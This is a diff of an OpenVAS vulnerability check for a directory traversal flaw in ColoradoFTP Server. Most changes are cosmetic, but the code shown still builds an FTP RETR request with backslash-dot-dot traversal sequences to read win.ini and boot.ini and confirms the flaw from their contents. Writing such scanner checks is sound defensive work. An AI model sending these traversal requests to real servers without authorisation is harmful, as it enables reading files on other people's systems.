@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_colorado_ftp_server_dir_trav_vun.nasl 7579 2017-10-26 11:10:22Z cfischer $
+# $Id: gb_colorado_ftp_server_dir_trav_vun.nasl 12363 2018-11-15 09:51:15Z asteins $
 #
 # ColoradoFTP Server Directory Traversal Vulnerability
 #
@@ -29,10 +29,10 @@ CPE = "cpe:/a:colorado:coloradoftpserver";
 if(description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.807877");
-  script_version("$Revision: 7579 $");
+  script_version("$Revision: 12363 $");
   script_tag(name:"cvss_base", value:"6.4");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:N");
-  script_tag(name:"last_modification", value:"$Date: 2017-10-26 13:10:22 +0200 (Thu, 26 Oct 2017) $");
+  script_tag(name:"last_modification", value:"$Date: 2018-11-15 10:51:15 +0100 (Thu, 15 Nov 2018) $");
   script_tag(name:"creation_date", value:"2016-08-17 16:19:22 +0530 (Wed, 17 Aug 2016)");
   script_name("ColoradoFTP Server Directory Traversal Vulnerability");
 
@@ -47,21 +47,19 @@ if(description)
   sequences (\\\..\\).");
 
   script_tag(name:"impact", value:"Successful exploitation will allow a remote
-  attacker to read arbitrary files on the affected application.
-
-  Impact Level: System/Application");
+  attacker to read arbitrary files on the affected application.");
 
   script_tag(name:"affected", value:"ColoradoFTP v1.3 Prime Edition (Build 8)
   Other versions may also be affected");
 
   script_tag(name:"solution", value:"Upgrade to ColoradoFTP Prime Edition (Build 9)
-  or later. For updates refer to http://cftp.coldcore.com");
+  or later.");
 
   script_tag(name:"solution_type", value:"VendorFix");
 
   script_tag(name:"qod_type", value:"remote_app");
 
-  script_xref(name : "URL" , value : "https://www.exploit-db.com/exploits/40231");
+  script_xref(name:"URL" , value:"https://www.exploit-db.com/exploits/40231");
 
   script_category(ACT_ATTACK);
   script_copyright("Copyright (C) 2016 Greenbone Networks GmbH");
@@ -69,21 +67,13 @@ if(description)
   script_dependencies("gb_colorado_ftp_server_detect.nasl", "secpod_ftp_anonymous.nasl");
   script_mandatory_keys("ColoradoFTP/Server/installed");
   script_require_ports("Services/ftp", 21);
+  script_xref(name:"URL", value:"http://cftp.coldcore.com");
   exit(0);
 }
 
 include("ftp_func.inc");
 include("host_details.inc");
 
-## Variable Initialization
-ftplogin = "";
-ftpPort = "";
-banner = "";
-user = "";
-pass = "";
-soc = "";
-
-## Get FTP Port
 if(!ftpPort = get_app_port(cpe:CPE)){
   exit(0);
 }
@@ -94,7 +84,6 @@ if(!soc){
   exit(0);
 }
 
-## Get the FTP user name and password
 user = get_kb_item("ftp/login");
 pass = get_kb_item("ftp/password");
 
@@ -135,14 +124,12 @@ if(!soc2)
 files = make_list("windows\\\\win.ini", "boot.ini", "winnt\\\\win.ini");
 foreach file (files)
 {
-  ## Construct the attack request
   file = string ("\\\\\\..\\\\..\\\\..\\\\..\\\\..\\\\..\\\\..\\\\..\\\\..\\\\..\\\\..\\\\..\\\\", file);
   attackreq = string("RETR ", file);
   send(socket:soc, data:string(attackreq, "\r\n"));
 
   result = ftp_recv_data(socket:soc2);
 
-  ## confirm the exploit
   if("\WINDOWS" >< result || "; for 16-bit app support" >< result
                                      || "[boot loader]" >< result)
   {
